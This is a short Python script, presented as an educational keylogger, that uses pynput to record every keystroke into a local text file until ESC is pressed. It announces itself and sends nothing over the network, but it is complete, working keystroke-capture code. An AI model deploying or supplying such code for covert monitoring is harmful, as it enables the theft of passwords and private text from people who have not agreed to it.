# keylogger.py
# Educational Purpose Keylogger
# DISCLAIMER: This script is for educational and ethical use only.
# Do NOT run this on systems without proper authorization.

from pynput import keyboard
from datetime import datetime

# Define the log file path
log_file = "key_log.txt"

# Write disclaimer and start time
with open(log_file, "w") as f:
    f.write("=== Educational Keylogger Log ===\n")
    f.write("DISCLAIMER: This script is for ethical, educational purposes only.\n")
    f.write(f"Log start time: {datetime.now()}\n\n")

# Function to handle key press events
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (like space, enter, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key.name}]")  # key.name gives readable name

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener when ESC is pressed
        with open(log_file, "a") as f:
            f.write("\n\n[Logging stopped by user]\n")
        return False

# Start the keylogger
print("Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
